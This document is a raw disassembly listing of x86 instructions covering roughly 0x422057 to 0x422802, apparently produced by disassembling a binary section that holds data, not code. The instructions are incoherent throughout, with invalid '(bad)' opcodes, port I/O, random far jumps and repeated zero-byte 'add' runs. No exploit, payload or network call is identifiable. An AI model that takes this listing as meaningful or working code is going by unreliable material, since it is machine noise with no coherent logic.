  422057:	add    BYTE PTR [eax],al
  422059:	add    BYTE PTR [ecx],bl
  42205b:	popa   
  42205c:	and    bh,cl
  42205e:	das    
  42205f:	in     eax,0x77
  422061:	mov    esp,0xecbde399
  422066:	xchg   al,al
  422068:	inc    ebp
  422069:	and    bh,bh
  42206b:	sub    al,0xd8
  42206d:	jae    0x4220c5
  42206f:	jae    0x422095
  422071:	mov    al,ds:0xfbc067fc
  422076:	das    
  422077:	push   esp
  422078:	daa    
  422079:	ficomp DWORD PTR [ebp+0x59]
  42207c:	pop    edx
  42207d:	or     al,0x24
  42207f:	or     eax,0xf300ec11
  422084:	dec    edx
  422085:	dec    esi
  422086:	jmp    0x422023
  422088:	mov    esi,0x731b84e1
  42208d:	xchg   edi,eax
  42208e:	out    0x1f,eax
  422090:	(bad)  
  422092:	lods   al,BYTE PTR ds:[esi]
  422093:	xchg   DWORD PTR [ebp+edi*8+0x3a],ebp
  422097:	or     ebp,DWORD PTR [edx-0x6b985fe9]
  42209d:	rol    eax,1
  42209f:	aad    0xd9
  4220a1:	pop    esp
  4220a2:	push   es
  4220a3:	sub    DWORD PTR ds:0x261df576,esp
  4220a9:	ja     0x422082
  4220ab:	cmc    
  4220ac:	xchg   esp,eax
  4220ad:	adc    cl,BYTE PTR [ebp+ebp*1+0x17a60512]
  4220b4:	pop    ecx
  4220b5:	xchg   edi,eax
  4220b6:	inc    esp
  4220b7:	addr16 std 
  4220b9:	idiv   BYTE PTR [edi]
  4220bb:	jmp    0x42216b
  4220c0:	add    BYTE PTR [eax],al
  4220c2:	mov    bl,0x55
  4220c4:	jg     0x422047
  4220c6:	jmp    FWORD PTR [ebx-0x69418801]
  4220cc:	push   0xe75e0b57
  4220d1:	test   al,ch
  4220d3:	xlat   BYTE PTR ds:[ebx]
  4220d4:	add    DWORD PTR [eax],eax
  4220d6:	arpl   WORD PTR [eax],ax
  4220d8:	add    BYTE PTR [eax],al
  4220da:	daa    
  4220db:	jns    0x422125
  4220dd:	in     al,0xea
  4220df:	cwde   
  4220e0:	and    eax,edx
  4220e2:	inc    esi
  4220e3:	(bad)  
  4220e4:	pusha  
  4220e5:	cmp    BYTE PTR [edi+0x3b3285c6],dh
  4220eb:	jg     0x4220d1
  4220ed:	mov    ds:0x5d5dd01c,al
  4220f2:	mov    ecx,0x94f69b8a
  4220f7:	loopne 0x422127
  4220f9:	cdq    
  4220fa:	(bad)  
  4220fb:	adc    eax,0xd79c7115
  422100:	outs   dx,DWORD PTR ds:[esi]
  422101:	ret    0xa30d
  422104:	lods   eax,DWORD PTR ds:[esi]
  422106:	or     esi,edi
  422108:	sbb    al,0x6e
  42210a:	retf   0x1fef
  42210d:	test   eax,0x2cf9cc8b
  422112:	push   ebx
  422113:	or     al,0xb8
  422115:	cdq    
  422116:	aam    0x7a
  422118:	stos   BYTE PTR es:[edi],al
  422119:	repnz and bh,BYTE PTR [ebx+edi*8+0x6257404a]
  422121:	sbb    edx,edi
  422123:	jecxz  0x422176
  422125:	ins    DWORD PTR es:[edi],dx
  422126:	fdivr  DWORD PTR [ebp+edi*4+0x54759051]
  42212d:	xchg   BYTE PTR [edi+0xc],bl
  422130:	xchg   esi,ebp
  422132:	sbb    DWORD PTR [edi-0x2],edx
  422135:	or     al,0xcb
  422137:	cmp    eax,0xf80780de
  42213c:	adc    al,0x0
  42213e:	add    BYTE PTR [eax],al
  422140:	add    BYTE PTR [eax],al
  422142:	cmp    dh,dl
  422144:	cmp    ah,BYTE PTR [esi+edi*8]
  422147:	in     al,dx
  422148:	fimul  WORD PTR ds:[edi+0x6cac6bd5]
  42214f:	jg     0x422192
  422151:	xor    cl,BYTE PTR [ebx-0x28]
  422154:	add    DWORD PTR [eax],eax
  422156:	arpl   WORD PTR [eax],ax
  422158:	add    BYTE PTR [eax],al
  42215a:	pop    esi
  42215b:	xchg   ebx,eax
  42215c:	ins    BYTE PTR es:[edi],dx
  42215d:	inc    edi
  42215e:	fwait
  42215f:	clc    
  422160:	fmul   DWORD PTR [ebp-0x47]
  422163:	cmp    BYTE PTR [ebx-0x7c],cl
  422166:	jg     0x422111
  422168:	or     esi,DWORD PTR [edx-0x1e6aa57a]
  42216e:	sbb    DWORD PTR [ebx],eax
  422170:	imul   edi,DWORD PTR [edx-0x2cd62b31],0x5
  422177:	xor    DWORD PTR [eax-0x2bc1fddc],eax
  42217d:	aaa    
  42217e:	je     0x42217d
  422180:	pop    edi
  422181:	ss sbb cl,bl
  422184:	sbb    ah,al
  422186:	inc    ecx
  422187:	mov    ss:0x7b8ffd65,al
  42218d:	cmp    eax,0x2095a74d
  422192:	mov    edi,0xe0360f2a
  422197:	fwait
  422198:	stc    
  422199:	mov    esp,0xc75a5dc3
  42219e:	push   esi
  42219f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221a0:	inc    ecx
  4221a1:	add    eax,0x2340f7ac
  4221a6:	and    esp,ebp
  4221a8:	sbb    eax,0x44620559
  4221ad:	lock in al,0x55
  4221b0:	xchg   ebx,eax
  4221b1:	ret    0x3b8
  4221b4:	push   es
  4221b5:	mov    ebx,0x3741349f
  4221ba:	or     BYTE PTR [edx],al
  4221bc:	mov    dh,0x0
  4221be:	add    BYTE PTR [eax],al
  4221c0:	add    BYTE PTR [eax],al
  4221c2:	fnstenv [esi-0x2490e49a]
  4221c8:	std    
  4221c9:	neg    BYTE PTR [esi]
  4221cb:	sub    esp,DWORD PTR [ebx-0x23]
  4221ce:	inc    esp
  4221cf:	ja     0x4221ff
  4221d1:	clc    
  4221d2:	scas   al,BYTE PTR es:[edi]
  4221d3:	fadd   DWORD PTR [ecx]
  4221d5:	add    BYTE PTR [ebx+0x0],ah
  4221d8:	add    BYTE PTR [eax],al
  4221da:	lds    eax,FWORD PTR [esi+0x4d]
  4221dd:	and    DWORD PTR [ebp+0x69],edi
  4221e0:	stc    
  4221e1:	dec    ebx
  4221e2:	es xchg ebp,eax
  4221e4:	and    bh,0x6c
  4221e7:	pop    edx
  4221e8:	ss jmp 0x6f6d3e1b
  4221ee:	ss retf 0x163e
  4221f2:	(bad)  
  4221f3:	cmp    eax,ebx
  4221f5:	ret    
  4221f6:	pop    ss
  4221f7:	test   dl,dl
  4221f9:	add    eax,0x5554c604
  4221fe:	popf   
  4221ff:	xlat   BYTE PTR ds:[ebx]
  422200:	jge    0x422200
  422202:	dec    edi
  422203:	mov    ecx,0xba3d5aad
  422208:	lahf   
  422209:	adc    ebx,ebp
  42220b:	and    BYTE PTR [esi-0x58b11618],cl
  422211:	inc    esp
  422212:	inc    ebx
  422213:	int3   
  422214:	xchg   ebx,eax
  422215:	popf   
  422216:	and    edx,esp
  422218:	add    esp,DWORD PTR [ebx+esi*8+0x31]
  42221c:	(bad)  
  42221d:	or     cl,BYTE PTR [edx]
  42221f:	xor    BYTE PTR ds:0x9571f329,dl
  422225:	cmp    eax,ecx
  422227:	lods   eax,DWORD PTR ds:[esi]
  422228:	xor    BYTE PTR [ebp-0xa22e17d],dh
  42222e:	aad    0x9c
  422230:	xor    eax,0x957bafff
  422235:	in     al,dx
  422236:	sbb    ebx,DWORD PTR [ebx+esi*8-0x7b]
  42223a:	cmc    
  42223b:	icebp  
  42223c:	add    BYTE PTR ds:[eax],al
  42223f:	add    BYTE PTR [eax],al
  422241:	add    dl,bl
  422243:	xor    dl,BYTE PTR [edi-0x20500076]
  422249:	jb     0x42224e
  42224b:	inc    ebp
  42224c:	mov    ds:0xe4c0d05c,eax
  422251:	xor    BYTE PTR [ecx],dl
  422253:	fld    DWORD PTR [ecx]
  422255:	add    BYTE PTR [ebx+0x0],ah
  422258:	add    BYTE PTR [eax],al
  42225a:	xlat   BYTE PTR ds:[ebx]
  42225b:	sbb    DWORD PTR [eax],esi
  42225d:	jno    0x4222c1
  42225f:	jno    0x4221e9
  422261:	mov    edi,0x474135ae
  422266:	jns    0x42225f
  422268:	scas   al,BYTE PTR es:[edi]
  422269:	aam    0xaa
  42226b:	jbe    0x4222eb
  42226d:	mov    bh,0x12
  42226f:	lahf   
  422270:	rol    DWORD PTR ds:0xdd003993,cl
  422276:	pop    es
  422277:	inc    ebp
  422278:	cmp    BYTE PTR [edx],ah
  42227a:	(bad)  
  42227b:	ret    0x1a02
  42227e:	iret   
  42227f:	nop
  422280:	fdivp  st(2),st
  422282:	pusha  
  422283:	dec    ecx
  422284:	push   cs
  422285:	xlat   BYTE PTR ds:[ebx]
  422286:	cmp    eax,0xbcbeb3db
  42228b:	icebp  
  42228c:	sbb    DWORD PTR [eax],ecx
  42228e:	call   0x24ab0bb3
  422293:	jg     0x422221
  422295:	repz pop esp
  422297:	cs sub eax,0xd4bdac35
  42229d:	jne    0x4222bb
  42229f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222a0:	xchg   esp,eax
  4222a1:	stos   DWORD PTR es:[edi],eax
  4222a2:	fstp   TBYTE PTR [eax+0x3a]
  4222a5:	dec    edi
  4222a6:	inc    esi
  4222a7:	hlt    
  4222a8:	mov    ds:0xcb950e8a,eax
  4222ad:	jo     0x422237
  4222af:	sbb    dl,BYTE PTR [eax-0x21]
  4222b2:	fnstcw WORD PTR [esi-0x2a]
  4222b5:	sar    BYTE PTR [edi-0x27e9bc89],cl
  4222bb:	adc    ebp,DWORD PTR [eax+eax*1+0x0]
  4222c2:	dec    eax
  4222c3:	in     al,0x3
  4222c5:	fwait
  4222c6:	scas   eax,DWORD PTR es:[edi]
  4222c7:	(bad)  
  4222c8:	fdiv   st,st(7)
  4222ca:	pop    esi
  4222cb:	sub    BYTE PTR [eax-0x66ec2171],bl
  4222d1:	call   0x63:0x1d974
  4222d8:	add    BYTE PTR [eax],al
  4222da:	clc    
  4222db:	adc    DWORD PTR [edx-0x6111d493],esp
  4222e1:	pop    ecx
  4222e2:	in     al,dx
  4222e3:	push   eax
  4222e4:	scas   al,BYTE PTR es:[edi]
  4222e5:	fimul  DWORD PTR [ebx]
  4222e7:	data16 scas al,BYTE PTR es:[edi]
  4222e9:	push   ecx
  4222ea:	dec    edi
  4222eb:	cmp    eax,0x11ab5afb
  4222f0:	daa    
  4222f1:	sbb    esi,DWORD PTR [esi-0x346da515]
  4222f7:	pop    ss
  4222f8:	or     eax,edx
  4222fa:	jne    0x422374
  4222fc:	jno    0x42232c
  4222fe:	push   0xffffffce
  422300:	shr    BYTE PTR [ebx+edx*8-0x64],1
  422304:	mov    ss,WORD PTR [edx]
  422306:	arpl   WORD PTR [edi-0x5f],bx
  422309:	scas   eax,DWORD PTR es:[edi]
  42230a:	sub    al,0xbf
  42230c:	xor    esi,DWORD PTR [edx]
  42230e:	sar    BYTE PTR [eax-0xeda57b9],0x52
  422315:	jnp    0x422327
  422317:	adc    eax,0x741b17c2
  42231c:	xor    ah,cl
  42231e:	sbb    eax,0x68440e74
  422323:	ins    DWORD PTR es:[edi],dx
  422324:	stos   BYTE PTR es:[edi],al
  422325:	in     al,0x96
  422327:	out    dx,al
  422328:	bound  edx,QWORD PTR [ebx+edi*2-0x29]
  42232c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42232d:	out    dx,eax
  42232e:	sub    esi,DWORD PTR [edi]
  422330:	push   es
  422331:	sub    BYTE PTR [eax+0x1178c834],0x63
  422338:	xchg   edx,eax
  422339:	xlat   BYTE PTR ds:[ebx]
  42233a:	das    
  42233b:	and    cl,BYTE PTR [esi+0x0]
  422341:	add    BYTE PTR [edx+0x4],dl
  422344:	mov    ds:0x72a6f682,al
  422349:	aam    0x6d
  42234b:	xor    dh,BYTE PTR [edx]
  42234d:	and    eax,0x8b4500e0
  422352:	xlat   BYTE PTR ds:[ebx]
  422353:	fld    DWORD PTR [ecx]
  422355:	add    BYTE PTR [ebx+0x0],ah
  422358:	add    BYTE PTR [eax],al
  42235a:	mov    ebp,0xabfa752f
  42235f:	or     edi,DWORD PTR [edi+0x4e]
  422362:	sbb    ecx,DWORD PTR [eax+0x30]
  422365:	das    
  422366:	(bad)  
  422367:	idiv   DWORD PTR [edi+ecx*8+0x62]
  42236b:	or     dl,al
  42236d:	and    al,0xe4
  42236f:	dec    edi
  422370:	dec    ebx
  422371:	sub    bl,dl
  422373:	inc    eax
  422374:	cmp    al,0x18
  422376:	nop
  422377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422378:	xchg   ebx,eax
  422379:	cmc    
  42237a:	jb     0x422375
  42237c:	xor    dl,bl
  42237e:	mov    cl,0x11
  422380:	push   esi
  422381:	mov    al,0x65
  422383:	xor    edi,edx
  422385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422386:	neg    edi
  422388:	or     ah,cl
  42238a:	add    BYTE PTR [ecx-0xece82e4],0xa
  422391:	pop    ds
  422392:	outs   dx,BYTE PTR ds:[esi]
  422393:	lahf   
  422394:	xchg   ebx,eax
  422395:	test   al,ch
  422397:	(bad)  
  422398:	and    dl,BYTE PTR [ebx+ecx*4]
  42239b:	fwait
  42239c:	out    dx,eax
  42239d:	mov    ds:0x1aa4b969,al
  4223a2:	dec    eax
  4223a3:	jl     0x422387
  4223a5:	pop    DWORD PTR ds:0x3133ed36
  4223ab:	pop    eax
  4223ac:	not    esi
  4223ae:	mov    esi,0x5af586d4
  4223b3:	adc    bh,BYTE PTR [edx]
  4223b5:	or     eax,0x83c2e87e
  4223ba:	mov    al,ds:0xe68c
  4223bf:	add    BYTE PTR [eax],al
  4223c1:	add    BYTE PTR [eax],bh
  4223c3:	push   0xffffff96
  4223c5:	add    edx,esi
  4223c7:	(bad)  
  4223c8:	mov    ebp,0xdb4ef67b
  4223cd:	out    0x61,eax
  4223cf:	popf   
  4223d0:	sub    BYTE PTR [ecx+0x1da3a],0x63
  4223d7:	add    BYTE PTR [eax],al
  4223d9:	add    BYTE PTR [ecx+eiz*2-0x1e976fbb],al
  4223e0:	lds    ebp,FWORD PTR [esi-0x773e98c2]
  4223e6:	repnz mov dl,0x59
  4223e9:	push   eax
  4223ea:	add    eax,0xc9f6f4bb
  4223ef:	jge    0x42241b
  4223f1:	test   DWORD PTR [eax-0x871d304],0x987f65f7
  4223fb:	dec    edx
  4223fc:	add    al,0xb7
  4223fe:	or     ebx,DWORD PTR [ecx+esi*4+0x3312f76a]
  422405:	mov    ds:0x232b5a9d,al
  42240a:	mov    bh,0x20
  42240c:	adc    eax,0x21119845
  422411:	jbe    0x4223f9
  422413:	cmp    BYTE PTR [eax+ebx*8+0x67],ch
  422417:	add    ebx,DWORD PTR [edi+ecx*4-0x1d]
  42241b:	dec    edx
  42241c:	cmp    BYTE PTR [edx+0x1acb1feb],bh
  422422:	clc    
  422423:	add    eax,0x25699940
  422428:	clc    
  422429:	cmp    bh,dh
  42242b:	xchg   DWORD PTR [edi+0x7],edi
  42242e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242f:	in     eax,dx
  422430:	int    0xcb
  422432:	lods   al,BYTE PTR ds:[esi]
  422433:	div    edi
  422435:	div    dh
  422437:	jbe    0x4224a9
  422439:	dec    edx
  42243a:	sti    
  42243b:	adc    al,0x4
  42243d:	add    BYTE PTR [eax],al
  42243f:	add    BYTE PTR [eax],al
  422441:	add    cl,ch
  422443:	mov    ecx,0xf37a307a
  422448:	jmp    0x422443
  42244a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42244e:	aas    
  42244f:	pop    esp
  422450:	(bad)  
  422451:	jb     0x4223f0
  422453:	fiadd  DWORD PTR [ecx]
  422455:	add    BYTE PTR [ebx+0x0],ah
  422458:	add    BYTE PTR [eax],al
  42245a:	inc    esp
  42245b:	fistp  WORD PTR [esi]
  42245d:	and    al,0x1d
  42245f:	pushf  
  422460:	aaa    
  422461:	scas   eax,DWORD PTR es:[edi]
  422462:	sbb    eax,0xde279c26
  422467:	fimul  DWORD PTR [edx+0x32]
  42246a:	adc    eax,0xf00430dc
  42246f:	ins    DWORD PTR es:[edi],dx
  422470:	or     ebx,DWORD PTR [edx]
  422472:	inc    ebx
  422473:	inc    ecx
  422474:	fcomp  DWORD PTR [edi-0x13932a7d]
  42247a:	div    BYTE PTR [edi-0x3ae07b25]
  422480:	sbb    ebp,esi
  422482:	push   0x78807bd3
  422487:	jbe    0x42247f
  422489:	jae    0x4224bb
  42248b:	cdq    
  42248c:	in     eax,dx
  42248d:	or     BYTE PTR [eax],cl
  42248f:	jp     0x4224f1
  422491:	and    cl,cl
  422493:	push   es
  422494:	dec    ebp
  422495:	stos   DWORD PTR es:[edi],eax
  422496:	imul   edx,DWORD PTR [ebx-0xa],0x6e
  42249a:	dec    eax
  42249b:	in     al,0x13
  42249d:	fsubr  QWORD PTR [ebp+0x46]
  4224a0:	pop    edi
  4224a1:	pop    eax
  4224a2:	pmaddwd mm0,QWORD PTR [ebx+0x56]
  4224a6:	popa   
  4224a7:	out    dx,al
  4224a8:	test   DWORD PTR [edx],edx
  4224aa:	push   ebp
  4224ab:	fdiv   QWORD PTR [esi]
  4224ad:	or     dl,BYTE PTR [eax+esi*8-0x36]
  4224b1:	pusha  
  4224b2:	push   eax
  4224b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224b4:	in     eax,0xf0
  4224b6:	pop    ebp
  4224b7:	ss fwait
  4224b9:	or     DWORD PTR [eax+0xf06c],edx
  4224bf:	add    BYTE PTR [eax],al
  4224c1:	add    BYTE PTR [ebx+0x41],bl
  4224c4:	pop    ebx
  4224c5:	iret   
  4224c6:	pop    ebx
  4224c7:	(bad)  
  4224c9:	aad    0xf
  4224cb:	ss dec esp
  4224cd:	dec    esi
  4224ce:	popf   
  4224cf:	push   ebx
  4224d0:	shl    BYTE PTR [ebp+0x1db00],cl
  4224d6:	arpl   WORD PTR [eax],ax
  4224d8:	add    BYTE PTR [eax],al
  4224da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224db:	jp     0x42250a
  4224dd:	cmp    cl,dh
  4224df:	jb     0x4224f0
  4224e1:	imul   edi,ecx,0xfda8f2fb
  4224e7:	idiv   DWORD PTR [ebx+0x5a]
  4224ea:	sub    al,0x4e
  4224ec:	test   DWORD PTR [esi],eax
  4224ee:	sub    DWORD PTR [ebx],esi
  4224f0:	jle    0x42255b
  4224f2:	push   0xd
  4224f4:	repnz ds jmp 0x594:0x4330779b
  4224fd:	pop    esp
  4224fe:	cmp    eax,0xcd3955e2
  422503:	cmp    al,0xe0
  422505:	stos   BYTE PTR es:[edi],al
  422506:	in     al,dx
  422507:	fimul  WORD PTR [ebx+0xf3d640d]
  42250d:	sbb    DWORD PTR [edi-0x78],edi
  422510:	pop    esp
  422511:	ror    BYTE PTR [edx-0x71],cl
  422514:	(bad)  [esi]
  422516:	(bad)  
  422517:	mov    edx,DWORD PTR [ecx+0x171da765]
  42251d:	aaa    
  42251e:	xchg   ecx,eax
  42251f:	leave  
  422520:	aad    0x8a
  422522:	das    
  422523:	pop    eax
  422524:	sbb    eax,0xf56c4d6f
  422529:	pop    es
  42252a:	mov    ds:0x585a0c96,eax
  42252f:	cmp    bh,BYTE PTR [ecx+0x1ec33762]
  422535:	(bad)  [edi]
  422537:	jno    0x42258d
  422539:	mulps  xmm5,XMMWORD PTR [esi]
  42253c:	adc    DWORD PTR [eax],eax
  42253e:	add    BYTE PTR [eax],al
  422540:	add    BYTE PTR [eax],al
  422542:	fwait
  422543:	test   DWORD PTR [ebp+0x3c],esp
  422546:	jg     0x422544
  422548:	(bad)  [edi-0x65be08a1]
  42254e:	or     bh,0x20
  422551:	aaa    
  422552:	arpl   bx,bx
  422554:	add    DWORD PTR [eax],eax
  422556:	arpl   WORD PTR [eax],ax
  422558:	add    BYTE PTR [eax],al
  42255a:	xchg   esi,eax
  42255b:	lock sti 
  42255d:	jmp    0x89049087
  422562:	lods   eax,DWORD PTR ds:[esi]
  422563:	inc    edi
  422564:	adc    ch,BYTE PTR [esi-0x5780948a]
  42256a:	rcl    ah,cl
  42256c:	mov    ebx,0xc2a0bf84
  422571:	mov    WORD PTR [edi+0x38],es
  422574:	mov    dh,0x15
  422576:	jb     0x422543
  422578:	jp     0x422547
  42257a:	ret    0xc854
  42257d:	call   0x1507:0x82f849be
  422584:	in     al,dx
  422585:	test   DWORD PTR [ebx],esp
  422587:	mov    edx,0x4bbf13f
  42258c:	push   edi
  42258d:	dec    esp
  42258e:	idiv   BYTE PTR [ebx-0x6a9bba13]
  422594:	stc    
  422595:	inc    ecx
  422596:	ds dec esp
  422598:	push   gs
  42259a:	sbb    eax,0x37af0e0b
  42259f:	push   esi
  4225a0:	xor    DWORD PTR [ecx+0x40],esp
  4225a3:	jle    0x4225d6
  4225a5:	jl     0x4225e1
  4225a7:	test   DWORD PTR [ecx-0x3a],edi
  4225aa:	pop    ds
  4225ab:	xchg   edx,eax
  4225ac:	pop    esi
  4225ad:	pop    edi
  4225ae:	leave  
  4225af:	test   eax,ebp
  4225b1:	or     eax,0x3b02719a
  4225b6:	sbb    eax,0x47bc4be0
  4225bb:	mov    eax,0x2e
  4225c0:	add    BYTE PTR [eax],al
  4225c2:	outs   dx,BYTE PTR ds:[esi]
  4225c3:	jae    0x4225b5
  4225c5:	retf   0xcbfd
  4225c8:	jle    0x4225c1
  4225ca:	repz xor eax,0xcdbe8ce9
  4225d0:	into   
  4225d1:	dec    edi
  4225d2:	(bad)  
  4225d3:	fild   DWORD PTR [ecx]
  4225d5:	add    BYTE PTR [ebx+0x0],ah
  4225d8:	add    BYTE PTR [eax],al
  4225da:	xchg   DWORD PTR [edx-0x65fc2575],ebp
  4225e0:	icebp  
  4225e1:	inc    BYTE PTR [eax]
  4225e3:	push   eax
  4225e4:	(bad)  
  4225e5:	leave  
  4225e6:	pop    ebp
  4225e7:	sub    eax,0x40b1620b
  4225ec:	stos   DWORD PTR es:[edi],eax
  4225ed:	mov    cl,0xff
  4225ef:	pop    eax
  4225f0:	push   ss
  4225f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225f2:	mov    ecx,0x1fd46fd4
  4225f7:	aas    
  4225f8:	lea    ebp,[edx+ecx*2-0x1a176d80]
  4225ff:	cmp    eax,0x4d332d80
  422604:	mov    ebp,0x2ab8c79
  422609:	pushf  
  42260a:	jecxz  0x422651
  42260c:	jb     0x422641
  42260e:	fiadd  DWORD PTR [ebx+0x7376720d]
  422614:	mov    ch,0x26
  422616:	repnz pushf 
  422618:	pop    ebx
  422619:	sbb    esp,esi
  42261b:	mov    DWORD PTR [esp+edi*4+0x139c8460],ebx
  422622:	mov    BYTE PTR [esi],bh
  422624:	hlt    
  422625:	inc    edx
  422626:	pop    ss
  422627:	adc    ch,ah
  422629:	repnz not bl
  42262c:	gs xor eax,0xe562e060
  422632:	stos   DWORD PTR es:[edi],eax
  422633:	add    eax,0xefbe4304
  422638:	test   al,0x44
  42263a:	add    al,bl
  42263c:	push   esp
  42263d:	add    BYTE PTR [eax],al
  42263f:	add    BYTE PTR [eax],al
  422641:	add    ch,dh
  422643:	adc    al,0xae
  422645:	adc    ebp,edi
  422647:	mov    ebx,0x84e6f6fd
  42264c:	lds    ebp,FWORD PTR [edx-0x11011633]
  422652:	sub    esp,ebx
  422654:	add    DWORD PTR [eax],eax
  422656:	arpl   WORD PTR [eax],ax
  422658:	add    BYTE PTR [eax],al
  42265a:	call   0x722f:0xdce73f63
  422661:	push   esp
  422662:	push   ebx
  422663:	or     ebp,edi
  422665:	int    0xf2
  422667:	fist   DWORD PTR [eax+0x5702f07a]
  42266d:	rcl    edi,1
  42266f:	lea    edi,[ebp+0xe]
  422672:	mov    al,ds:0xabf97c88
  422677:	stos   BYTE PTR es:[edi],al
  422678:	cmp    BYTE PTR [ecx-0x2c1ba6c4],al
  42267e:	or     dh,ah
  422680:	aad    0xd2
  422682:	cmp    dh,BYTE PTR [ebp+0x50d31de2]
  422688:	or     BYTE PTR [edi-0x1f],ah
  42268b:	(bad)  
  42268c:	jb     0x7ba582d5
  422692:	push   esi
  422693:	jae    0x4226ba
  422695:	and    esp,DWORD PTR [ebx+edi*8+0xdf1dc30]
  42269c:	mov    dl,0x60
  42269e:	ja     0x4226fe
  4226a0:	add    bl,BYTE PTR [esi+0x128c752f]
  4226a6:	ss sti 
  4226a8:	enter  0x36ee,0xd3
  4226ac:	dec    esp
  4226ad:	xor    al,0xc7
  4226af:	pushf  
  4226b0:	jb     0x4226fc
  4226b2:	push   0x3e
  4226b4:	mov    ah,0x5
  4226b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226b7:	cdq    
  4226b8:	enter  0x8ed,0x0
  4226bc:	loop   0x4226be
  4226be:	add    BYTE PTR [eax],al
  4226c0:	add    BYTE PTR [eax],al
  4226c2:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  4226c8:	mov    edi,0xbb1c16fb
  4226cd:	shl    BYTE PTR [ecx+eax*2-0x23736e4e],0x1
  4226d5:	add    BYTE PTR [ebx+0x0],ah
  4226d8:	add    BYTE PTR [eax],al
  4226da:	sub    edi,ecx
  4226dc:	push   edx
  4226dd:	jae    0x4226ff
  4226df:	dec    esi
  4226e0:	dec    edx
  4226e1:	(bad)  
  4226e2:	arpl   WORD PTR [eax],bp
  4226e4:	and    bh,BYTE PTR [ecx+0x2032769e]
  4226ea:	or     al,0x1b
  4226ec:	jmp    0x6ffb837b
  4226f1:	cmp    DWORD PTR [edx-0x20972abb],esp
  4226f7:	(bad)  
  4226f8:	mov    gs,edx
  4226fa:	or     ch,BYTE PTR [esi-0x1c5a22f2]
  422700:	jle    0x422759
  422702:	(bad)  
  422703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422704:	mov    bh,0xc7
  422706:	or     edx,DWORD PTR [eax]
  422708:	push   edx
  422709:	aad    0xea
  42270b:	inc    eax
  42270c:	clc    
  42270d:	sub    eax,0x64eec69f
  422712:	mov    WORD PTR [ecx+0x3cdfcb81],?
  422718:	lods   al,BYTE PTR ds:[esi]
  422719:	xlat   BYTE PTR ds:[ebx]
  42271a:	in     eax,dx
  42271b:	das    
  42271c:	repz xor al,0xa9
  42271f:	add    ecx,DWORD PTR [edi+0x7149dd86]
  422725:	int    0x3e
  422727:	xchg   ecx,eax
  422728:	ror    BYTE PTR [edi+0x641c5935],cl
  42272e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42272f:	sbb    ah,BYTE PTR [ecx+0x2ad9c766]
  422735:	ds in  al,0x6c
  422738:	or     ebp,ebx
  42273a:	ja     0x4226da
  42273c:	lods   eax,DWORD PTR ds:[esi]
  42273d:	add    BYTE PTR [eax],al
  42273f:	add    BYTE PTR [eax],al
  422741:	add    ah,dl
  422743:	sqrtps xmm6,xmm0
  422746:	(bad)  
  422748:	cmc    
  422749:	das    
  42274a:	sbb    BYTE PTR [eax],cl
  42274c:	xchg   ebx,eax
  42274d:	iret   
  42274e:	sub    DWORD PTR [ebx],eax
  422750:	pop    edx
  422751:	inc    esp
  422752:	out    dx,eax
  422753:	fadd   QWORD PTR [ecx]
  422755:	add    BYTE PTR [ebx+0x0],ah
  422758:	add    BYTE PTR [eax],al
  42275a:	nop
  42275b:	sbb    al,0xda
  42275d:	ins    BYTE PTR es:[edi],dx
  42275e:	mov    WORD PTR [ecx],cs
  422760:	cdq    
  422761:	pusha  
  422762:	push   ds
  422763:	xchg   edx,eax
  422764:	(bad)  
  422766:	mov    DWORD PTR [esi+ecx*2-0x4d],esp
  42276a:	push   esp
  42276b:	int3   
  42276c:	bound  ebp,QWORD PTR [ebx-0x44aae489]
  422772:	adc    al,0xd8
  422774:	addr16 pop ds
  422776:	or     DWORD PTR [ebx],ecx
  422778:	or     al,0x5c
  42277a:	mov    dl,0x9b
  42277c:	(bad)  
  42277d:	jge    0x42270f
  42277f:	fiadd  WORD PTR [ebx]
  422781:	push   0x17
  422783:	xchg   DWORD PTR [ecx],edx
  422785:	fwait
  422786:	lahf   
  422787:	jne    0x4227ae
  422789:	mov    eax,ds:0x451b410a
  42278e:	jb     0x4227ec
  422790:	pop    ebx
  422791:	mov    dh,0xfc
  422793:	loopne 0x4227b5
  422795:	shr    bh,0x85
  422798:	loopne 0x4227ed
  42279a:	inc    ebp
  42279b:	mov    WORD PTR [ebx],gs
  42279d:	shl    BYTE PTR [edx-0x53690eb7],1
  4227a3:	bound  edx,QWORD PTR [ebp-0x384f5e56]
  4227a9:	sub    BYTE PTR [edx],al
  4227ab:	push   ds
  4227ac:	nop
  4227ad:	int3   
  4227ae:	xchg   ebp,eax
  4227af:	es pushf 
  4227b1:	add    dl,BYTE PTR [eax-0x4734e736]
  4227b7:	and    edx,DWORD PTR [ebp+esi*8+0x31de2]
  4227be:	add    BYTE PTR [eax],al
  4227c0:	add    BYTE PTR [eax],al
  4227c2:	int    0x2d
  4227c4:	xchg   ebp,eax
  4227c5:	inc    ebx
  4227c6:	cmc    
  4227c7:	sti    
  4227c8:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4227ce:	pop    ds
  4227cf:	jo     0x422839
  4227d1:	jae    0x422825
  4227d3:	fld    QWORD PTR [ecx]
  4227d5:	add    BYTE PTR [ebx+0x0],ah
  4227d8:	add    BYTE PTR [eax],al
  4227da:	inc    edi
  4227db:	scas   al,BYTE PTR es:[edi]
  4227dc:	int    0x78
  4227de:	outs   dx,DWORD PTR ds:[esi]
  4227df:	lea    eax,[edi+eiz*1-0x31253f03]
  4227e6:	and    BYTE PTR [edi+0x3e],0xb6
  4227ea:	add    dh,BYTE PTR [edx]
  4227ec:	sbb    eax,0xbf18c582
  4227f1:	inc    esp
  4227f2:	hlt    
  4227f3:	xchg   ecx,eax
  4227f4:	ds ss mov ebx,0x76122c5b
  4227fb:	jl     0x42280f
  4227fd:	and    eax,0xe2e1c245
  422802:	retf   0x30a7
